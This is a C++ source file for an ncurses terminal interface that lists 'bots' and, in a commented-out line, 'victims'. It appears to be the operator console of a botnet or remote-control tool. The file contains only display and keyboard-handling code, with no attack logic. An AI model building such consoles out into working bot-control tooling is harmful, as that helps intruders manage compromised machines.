#include "user_interface.h"

#include <ncurses.h>

user_interface::user_interface() {
	initscr();
	noecho();
	cbreak();
	getmaxyx(stdscr, screen_heigth_, screen_width_);
}

user_interface::~user_interface() { endwin(); }

void user_interface::loadLogo() {
	const std::string output = "Connected to the server! Press [ENTER] to continue...";
	move(screen_heigth_ / 2, (screen_width_ - output.size()) / 2);
	printw(output.c_str());
	getch();  // TODO: load real ascii logo
}

void user_interface::initWindows() {
	main_window_ = newwin((screen_heigth_ - 2), screen_width_, 0, 0);
	box(main_window_, 0, 0);
	keypad(main_window_, true);

	help_commands_window_ = newwin(2, screen_width_, screen_heigth_ - 2, 0);
}

void user_interface::reRenderMainWindowBox() {
	werase(main_window_);
	box(main_window_, 0, 0);
	// mvwprintw(main_window_, 0, 1, "[VICTIMS]");
}

void user_interface::start() {
	loadLogo();
	initWindows();

	wrefresh(main_window_);
	wrefresh(help_commands_window_);
	int choice;
	while (true) {
		choice = wgetch(main_window_);
		if (choice == 'u') {
			menu_handlers_["u"]();
		}
	}
	// std::vector<std::string> choices;
	// choices.reserve(menu_handlers_.size());
	// for (auto kv : menu_handlers_) {
	// 	choices.push_back(kv.first);
	// }

	// int choice;
	// int current = 0;

	// while (true) {
	// 	for (int i = 0; i < choices.size(); ++i) {
	// 		if (i == current) {
	// 			wattron(main_window_, A_REVERSE);
	// 		}
	// 		mvwprintw(main_window_, i + 1, 1, choices[i].c_str());
	// 		wattroff(main_window_, A_REVERSE);
	// 	}
	// 	choice = wgetch(main_window_);
	// 	if (choice == KEY_UP || choice == 'k') {
	// 		--current;
	// 		if (current == -1) {
	// 			++current;
	// 		};
	// 	}
	// 	if (choice == KEY_DOWN || choice == 'j') {
	// 		++current;
	// 		if (current >= choices.size()) {
	// 			--current;
	// 		};
	// 	}
	// 	if (choice == 10) {
	// 		menu_handlers_[choices[current]]();
	// 	}
	// }
}

void user_interface::updateWindow(WINDOW* wind, std::vector<std::string>& items) {
	std::unique_lock<std::mutex> lock(ui_update_m_);
	for (int i = 0; i < items.size(); ++i) {
		mvwprintw(wind, i + 1, 1, (items[i]).c_str());
	}
	wrefresh(wind);
}

void user_interface::updateBots(std::vector<std::string>& data) {
	reRenderMainWindowBox();
	updateWindow(main_window_, data);
    // mvwprintw(main_window_, 0, 1, "[List of active bots]");
	wrefresh(main_window_);
}

void user_interface::updateTitles(std::vector<std::string>& params, std::vector<int>& max_sizes, std::string& separator) {
	int parameters_num = stoi(params[0]);
	int x_spaces = 1;
	for (int i = 1; i < 1 + parameters_num; ++i) {
        // std::cout << "HELLO" << std::endl;
        mvwprintw(main_window_, 0, x_spaces, params[i].c_str());
        x_spaces += max_sizes[i-1] + separator.size(); 
	}
	wrefresh(main_window_);
}
